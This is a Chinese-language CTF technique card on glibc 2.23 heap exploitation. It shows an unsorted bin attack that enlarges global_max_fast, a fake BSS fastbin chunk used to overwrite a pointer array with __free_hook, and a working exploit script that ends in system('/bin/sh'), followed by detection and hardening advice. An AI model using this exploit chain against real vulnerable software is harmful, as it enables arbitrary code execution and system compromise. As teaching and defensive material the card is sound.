---
id: binary-pwn-heap-unsorted-bin-global-max-fast-bss-fake-fastbin-free-hook
title: unsorted bin attack 放大 global_max_fast：BSS 假 fastbin 块覆盖 ptr 数组后改 __free_hook
type: scenario
domain: binary
path: binary/pwn/heap
technique: unsorted-bin-global-max-fast-bss-fake-fastbin-free-hook
aliases:
- global_max_fast 放大
- unsorted bin attack 打 global_max_fast
- BSS 假 fastbin 块
- chunk_size 数组当 chunk
- ptr 数组覆盖 __free_hook
tags:
- pwn
- heap
- glibc223
- unsorted-bin
- global-max-fast
- fastbin
- bss
- free-hook
- uaf
- ctf
cve: []
severity: high
confidence: medium
affected_versions: glibc 2.23（原文题目环境）
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V178
  verified_at: '2026-11-06T17:44:22+08:00'
  notes: 已对照原文pwn2 exp与图06/08/12-19核对并修正：申请范围0x80-0x400、unsorted bin attack改global_max_fast=libc+0x3c67f8、BSS假chunk实际在chunk_size+0x28=0x202088（size字段chunk_size[6]=0x91，对应malloc(0x80)的0x90 fastbin下标）、heap-0x30B8指向该假块、payload p64(0x1000)*5+free_hook覆盖ptr[0]、edit(0)/edit(1)/dele(1)收尾均与gdb一致；原卡误写chunk_size起始/chunk_size[1]/10个qword，已改正；affected_versions保留glibc 2.23（原文题目环境）；无CVE、无sources/source_url；未复跑exp。
---

## 一句话结论

在 glibc 2.23 的 UAF 堆题里，若只能申请 0x80–0x400 的块（默认这些块不进 fastbin），可以先用 unsorted bin attack 把 `global_max_fast` 改成一个很大的 libc 地址，使后续释放的大块进入 fastbin；再把 BSS 中可控的 `chunk_size` 数组当作假 fastbin chunk，让它与相邻的 `ptr` 指针数组重叠，分配后覆盖 `ptr[0]` 为 `__free_hook`，最后 `free("/bin/sh")` 触发 `system`。

## 原理

- **默认 fastbin 上限**：64 位 glibc 的 `global_max_fast` 默认是 `DEFAULT_MXFAST = 0x80`；`free` 只把 `size <= global_max_fast` 的 chunk 放进 fastbin。题目限制申请 0x80–0x400，正常释放不会进 fastbin，因此无法直接做 fastbin attack。
- **unsorted bin attack**：释放一个 chunk 进 unsorted bin 后，用 UAF 改它的 `bk` 为 `target - 0x10`；当该 chunk 被重新分配、从 unsorted bin 摘除时，`bck = victim->bk; bck->fd = unsorted_chunks(av);` 会向 `target` 写入一个 libc 指针（`main_arena` 相关地址）。这是一次“写一个不可控的 libc 地址到任意位置”的原语。
- **放大 global_max_fast**：把 `target` 设为 `global_max_fast`（案例 glibc 2.23 偏移 `libc + 0x3c67f8`），写入的 libc 指针远大于 0x400，于是之后所有 0x80–0x400 的释放都会进入 fastbin，解锁 fastbin attack。
- **BSS 假 fastbin chunk**：程序的 `chunk_size[10]` 数组保存用户申请的 size（可控），`ptr[10]` 数组位于其后 0x60 处（案例 `chunk_size=0x202060`、`ptr=0x2020C0`）。把数组内部的一个位置当成 chunk 头（案例 `chunk_size+0x28`，即 `0x202088`）：
  - 该处 8 字节为 prev_size（0x88），紧随的 size 字段为 `chunk_size[6]=0x91`（屏蔽标志后为 0x90，正好匹配 `malloc(0x80)` 的 fastbin 下标）；
  - 通过 UAF 把某个已释放 fastbin chunk 的 `fd` 改成该假 chunk 地址（案例 `heap-0x30B8`），下一次 `malloc` 就返回假 chunk 的 user data（案例 `0x202098`）；
  - 从 user data 写入 `p64(0x1000)*5 + p64(__free_hook)` 会覆盖到 `ptr[0]`，把它改成 `__free_hook`。
- **收尾**：`edit(0, system)` 通过 `ptr[0]` 把 `system` 写到 `__free_hook`；`edit(1, "/bin/sh")` 把字符串写到 chunk 1；`free(chunk1)` 触发 `__free_hook("/bin/sh")` → `system("/bin/sh")`。
- 案例 glibc 2.23 关键偏移：`main_arena = libc + 0x3c4b20`、`global_max_fast = libc + 0x3c67f8`、`__free_hook` 由 `libc.sym['__free_hook']` 取得；unsorted bin 的 `fd` 用于泄露 libc，`bk` 用于泄露堆地址。

## 触发条件

- glibc 2.23（无 tcache）或 `global_max_fast` 仍可被改写的版本；存在 UAF/编辑已释放 chunk 的能力。
- 程序限制申请大小在 fastbin 上限之上（如 0x80–0x400），但释放的 chunk 能进入 unsorted bin/small bin。
- 存在可读的 UAF（show）用于泄露 libc/堆，且能编辑已释放 chunk 的 `fd`/`bk`。
- BSS 中有可控的 size 数组，且指针数组位于其后固定偏移处（案例 `ptr` 在 `chunk_size+0x60`），能构造合法假 chunk 的 size 字段。
- 有 `__free_hook`（或 `__malloc_hook`）可写。

## 利用步骤

1. **泄露**：申请若干 0x88/0xa8 块，释放一个进 unsorted bin，`show` 读 `fd` 得 libc（案例 `libc_ - 0x3c4b78`），再释放/读取另一个块得堆地址。
2. **布置 unsorted bin**：重新申请块恢复布局，保留一个可 UAF 编辑的已释放 unsorted chunk（案例 chunk 0）。
3. **改 bk**：`edit(0, p64(libc_)+p64(global_max_fast-0x10))`，把 `fd` 写回原值、`bk` 指向 `global_max_fast - 0x10`。
4. **触发 unsorted bin attack**：申请一个与 victim 同大小的块（案例 `add(0xa8)`），从 unsorted bin 摘除时向 `global_max_fast` 写入 libc 指针，放大 fastbin 上限。
5. **制造 fastbin 块**：释放一个大小在 0x80–0x400 的块（案例 `dele(2)`），此时它进入 fastbin。
6. **改 fd 指向 BSS**：`edit(2, p64(fake_chunk_addr))`（案例 `heap-0x30B8 = 0x202088`），把 fastbin chunk 的 `fd` 指向 BSS 假块；确保假块 `size` 字段（案例 `chunk_size[6]=0x91`）与申请大小的 fastbin 下标一致。
7. **分配假块并覆盖 ptr**：`add(0x80)` 返回 BSS 假块；再次 `add(0x80, payload)` 写入 `p64(0x1000)*5 + p64(__free_hook)`，把 `ptr[0]` 覆盖为 `__free_hook`。
8. **写 hook 并触发**：`edit(0, p64(system))`、`edit(1, b"/bin/sh")`、`dele(1)`。

## PoC

```python
# glibc 2.23，关键步骤（偏移按案例环境）
libc_base = libc_ - 0x3C4B78
edit(0, p64(libc_) + p64(libc_base + 0x3c67f8 - 0x10))  # bk -> global_max_fast-0x10
add(0xa8, b'a')          # unsorted bin attack: global_max_fast = libc pointer
dele(2)                  # 0x88 块进入 fastbin（因为 global_max_fast 已放大）

edit(2, p64(heap - 0x30B8))  # fd -> BSS 假 chunk（chunk_size+0x28=0x202088，size=0x91）
add(0x80, b'a')              # 返回 BSS 假块
add(0x80, p64(0x1000)*5 + p64(libc_base + libc.sym['__free_hook']))
# 此时 ptr[0] = __free_hook（ptr 位于 chunk_size+0x60）

edit(0, p64(libc_base + libc.sym['system']))  # __free_hook = system
edit(1, b'/bin/sh\x00')
dele(1)                                      # free("/bin/sh") -> system
```

案例 BSS 布局：`chunk_size` 在 `0x202060`，`ptr` 在 `0x2020C0`（相差 0x60，即 12 个 qword）；假 chunk 头在 `chunk_size+0x28`（`0x202088`，size 字段 0x91），`heap - 0x30B8` 指向该假 chunk。本卡不执行样本。

## 变体与关联

- `global_max_fast` 也可用 large bin attack 改写（见 largebin attack 卡），或改 `mp_.tcache_bins` 放大 tcache（高版本）。
- BSS 假块可换成其它可控全局数组（如 `stdin`/`stdout` 指针、GOT 附近），只要 size 字段能通过 fastbin 检查。
- 若没有 UAF 读取，可先用 fastbin dup/unsorted bin 泄露；若 `__free_hook` 不存在（高版本），改打 `_IO_list_all`/FSOP、`exit_funcs`、`tcache_perthread_struct`。
- 关联：[[binary-pwn-heap-delete-compaction-stale-slot-fastbin-dup]]（glibc 2.23 fastbin dup）、[[binary-pwn-heap-largebin-attack-glibc231-middle-insert-checks]]（largebin attack 变体目标含 global_max_fast）、[[binary-pwn-heap-abs-intmin-length-bypass-bss-fake-chunk-tcache-got]]（BSS 假 chunk 投毒 tcache）、[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（__free_hook 收尾）。
- 边界：高版本 glibc 移除 `__free_hook`/`__malloc_hook`，且 `global_max_fast` 有额外检查；BSS 假块的 size/对齐必须合法，否则 fastbin 报 `malloc(): memory corruption`；案例偏移依赖 glibc 2.23，迁移需重新确定。

## 检测与防御

- 代码审计：UAF（free 后不清指针）、可编辑已释放 chunk、`chunk_size` 与 `ptr` 相邻的全局布局，都是可组合的利用面。
- 加固：free 后立即置空指针；不要把用户可控 size 与指针数组放在同一可写 BSS 区域；使用 tcache/更高版本 glibc 的安全检查。
- 检测：fastbin 中出现指向 `.bss`/非堆地址的 `fd`；`global_max_fast` 被改为异常大值；`__free_hook`/`__malloc_hook` 被写；`free` 时出现 `memory corruption`。
- 防御：启用 `MALLOC_CHECK_`/glibc malloc hardening、ASLR、Full RELRO；敏感程序避免导出可写全局函数指针。
